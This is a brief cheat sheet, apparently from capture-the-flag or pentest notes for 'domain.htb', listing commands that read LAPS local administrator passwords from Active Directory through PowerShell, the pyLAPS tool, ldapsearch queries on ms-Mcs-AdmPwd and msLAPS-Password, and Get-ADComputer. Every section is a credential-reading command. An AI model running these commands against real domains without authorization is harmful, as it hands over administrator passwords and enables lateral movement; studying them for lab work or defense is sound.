## LAPS Reader
```powershell
get-admpwdpassword -computername dc01 | Select password
```

## Linux
```powershell
git clone https://github.com/p0dalirius/pyLAPS
cd pyLAPS

python3 pyLAPS.py --action get -d "domain.htb" -u "istifadeci" -p "parol" --dc-ip <DC_IP>

export KRB5CCNAME=legacyy.ccache
python3 pyLAPS.py --action get -d "domain.htb" -u "istifadeci" -k --no-pass --dc-ip <DC_IP>
```

## LDAP
```powershell
# Legacy LAPS
ldapsearch -x -H ldap://<DC_IP> -D "istifadeci@domain.htb" -w 'parol' \
  -b "DC=domain,DC=htb" "(objectClass=computer)" ms-Mcs-AdmPwd

# Windows LAPS (yeni)
ldapsearch -x -H ldap://<DC_IP> -D "istifadeci@domain.htb" -w 'parol' \
  -b "DC=domain,DC=htb" "(objectClass=computer)" msLAPS-Password
```

## Windows
```powershell
Import-Module ActiveDirectory
Get-ADComputer -Identity "KOMPUTERADI" -Properties ms-Mcs-AdmPwd | Select-Object ms-Mcs-AdmPwd
```
